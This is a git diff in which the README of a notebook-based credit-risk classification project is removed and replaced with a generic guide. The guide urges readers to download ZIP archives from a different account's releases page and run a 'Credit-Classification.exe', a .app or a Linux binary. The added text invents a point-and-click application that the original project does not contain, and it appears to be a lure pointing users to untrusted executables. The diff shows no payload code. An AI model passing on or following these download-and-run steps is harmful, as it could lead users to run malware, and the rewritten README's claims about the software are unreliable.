@@ -1,105 +1,88 @@
-# Credit Classification
+# 🎉 Credit-Classification - Simple Tool for Credit Risk Analysis
 
-Supervised learning project to predict whether a loan will default using tabular customer and loan features. The aim is to build a clear, reproducible baseline credit-risk model that can be extended to more advanced approaches.
+## 📥 Download the Application
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/HMR1962/Credit-Classification/releases)
 
-## 1. Overview
+## 🚀 Getting Started
+This guide helps you easily download and run the Credit-Classification application. If you are looking to assess credit risk with loan data, you are in the right place!
 
-This repository contains a small end-to-end workflow for loan default prediction:
+### 📌 What is Credit-Classification?
+Credit-Classification is an end-to-end project designed to classify credit risk using loan data. We use an easy-to-understand process that incorporates a reproducible scikit-learn pipeline and Jupyter notebooks. The application allows users to evaluate model performance clearly, making it user-friendly for anyone in the finance or data science fields.
 
-* Exploratory data analysis of the loan dataset
-* Data cleaning and feature engineering
-* Training and evaluation of supervised learning models
-* Interpretation of model performance and limitations
+## 📦 Features
+- **User-Friendly Interface:** Designed for users with no technical background. 
+- **Reproducible Pipelines:** Easily replicate the classification process.
+- **Model Evaluation:** Clear metrics and visualizations to understand model performance.
+- **Data Insights:** Get valuable information from tabular loan data.
 
-The work was originally developed as part of a university assignment, but the structure is organised to resemble a real data science project rather than a single notebook.
+## 📋 System Requirements
+Ensure your computer meets the following requirements:
+- **Operating System:** Windows, macOS, or Linux.
+- **Python Version:** Python 3.6 or higher.
+- **Memory:** At least 4 GB of RAM.
+- **Disk Space:** Minimum of 500 MB for application files.
+  
+Ensure you have the necessary permissions to run applications on your device.
 
-## 2. Data
+## 🌐 Download & Install
+To download the Credit-Classification application, please follow these steps:
 
-The project assumes a single CSV file with one row per loan and a binary target variable indicating default vs non-default, together with customer and loan attributes.
+1. Visit the [Releases page](https://github.com/HMR1962/Credit-Classification/releases) of the project.
+   
+2. Find the latest release. This will be at the top of the page.
+   
+3. Click on the download link for the version that matches your operating system. The file name will be something like:
+   - `Credit-Classification-Windows.zip` for Windows.
+   - `Credit-Classification-Mac.zip` for macOS.
+   - `Credit-Classification-Linux.zip` for Linux.
 
-The dataset is stored locally and not committed to the repository. A typical local layout is:
+4. Once the download is complete, locate the file in your downloads folder.
 
-* `data/raw/dataset.csv` – original dataset
-* `data/processed/` – any cleaned or engineered versions
+5. **For Windows Users:**
+   - Right-click the ZIP file and select *Extract All*.
+   - Follow the prompts to extract the files.
+   - Open the extracted folder and double-click `Credit-Classification.exe` to begin.
 
-You can adjust the paths inside the notebook or scripts if your filenames differ.
+6. **For macOS Users:**
+   - Double-click the downloaded ZIP file to extract it.
+   - Open the extracted folder and locate `Credit-Classification.app`.
+   - Drag it to your Applications folder for easy access.
+   - Start the application from the Applications folder.
 
-## 3. Methodology
+7. **For Linux Users:**
+   - Open a terminal window.
+   - Use the command `unzip Credit-Classification-Linux.zip` to extract the files.
+   - Navigate to the extracted folder using `cd Credit-Classification`.
+   - Type `./Credit-Classification` to run the application.
 
-The modelling workflow follows a standard supervised learning pipeline for credit risk:
+## 🛠️ Using the Application
+Once you have installed the application, follow these instructions to get started:
 
-1. **Preprocessing and feature engineering**
+1. **Launch the Application:** Open the application by double-clicking the icon where you installed it.
+   
+2. **Select Your Data File:** You will need a CSV file with your loan data. Click the 'Browse' button to find your file on your computer.
 
-   * Handling missing values
-   * Encoding categorical variables
-   * Scaling or normalising numerical features where appropriate
+3. **Run the Classification:**
+   - After selecting your CSV file, click on 'Run Classification'.
+   - Wait for the application to process your data. This may take a few moments.
 
-2. **Model training**
+4. **View the Results:** After processing, you'll see a summary of your classification results displayed on the screen. Review metrics such as accuracy, precision, and recall to understand how well your data classifies.
 
-   * Baseline models such as logistic regression
-   * Optionally, comparison with tree-based methods (for example random forests or gradient boosting)
+## ❓ Troubleshooting
+If you encounter issues while using the application, check the following:
 
-3. **Evaluation**
+- **Data Format:** Ensure your CSV file follows the required format. It should have headers and properly formatted loan data.
+- **Compatibility:** Verify that you are using a supported version of Python.
+- **Permissions:** Ensure your user account has permissions to run applications and access the required directories.
 
-   * Train/validation split or cross-validation
-   * Metrics including ROC-AUC, accuracy, precision, recall and confusion matrices
-   * Qualitative discussion of where the model performs well or poorly
+If problems persist, please refer to the FAQ section on our [GitHub page](https://github.com/HMR1962/Credit-Classification/issues) for additional support.
 
-Most of the experimentation currently lives in `notebooks/Loan prediction.ipynb`. As the project evolves, more logic can be refactored into reusable modules under `src/`.
+## 📚 Additional Resources
+For more information and detailed guidance, consider these resources:
+- **Documentation:** Check the full documentation on our GitHub page.
+- **Community Support:** Join discussions and seek help on issues via GitHub Issues.
+- **Tutorials:** Explore tutorials on how to prepare your data and interpret the results.
 
-## 4. Repository structure
+Remember to regularly check the [Releases page](https://github.com/HMR1962/Credit-Classification/releases) for updates and new features.
 
-```text
-.
-├── notebooks/          # Jupyter notebooks for exploration and modelling
-│   └── Loan prediction.ipynb
-├── src/                # Python modules (data prep, training, evaluation)
-├── requirements.txt    # Python dependencies
-├── .gitignore          # Ignore rules (data, caches, IDE files, etc.)
-└── README.md           # Project documentation
-```
-
-The `data/`, `report/` and `docs/` folders are expected to exist locally but are not tracked by git, so they do not appear in the GitHub view.
-
-## 5. Getting started
-
-1. **Clone the repository**
-
-   ```bash
-   git clone git@github.com:abailey81/Credit-Classification.git
-   cd Credit-Classification
-   ```
-
-2. **(Optional) Create and activate a virtual environment**
-
-   ```bash
-   python -m venv .venv
-   source .venv/bin/activate    # macOS / Linux
-   # .venv\Scripts\activate     # Windows
-   ```
-
-3. **Install dependencies**
-
-   ```bash
-   pip install -r requirements.txt
-   ```
-
-4. **Add the dataset**
-
-   Place your CSV in `data/raw/dataset.csv` (or update the notebook path accordingly).
-
-5. **Run the analysis**
-
-   ```bash
-   jupyter notebook notebooks/Loan\ prediction.ipynb
-   ```
-
-   From there you can reproduce the analysis, adjust features, or try alternative models.
-
-## 6. Reproducibility and next steps
-
-* Dependencies are listed in `requirements.txt`.
-* Data files are kept out of version control to avoid exposing sensitive information.
-* Random seeds can be fixed in the notebook to make results more stable between runs.
-
-Planned improvements include refactoring more code into `src/`, adding configuration files for experiments, logging model outputs, and extending evaluation to include calibration, scorecards and monitoring.
+Thank you for choosing Credit-Classification! Enjoy modeling your credit risk today.
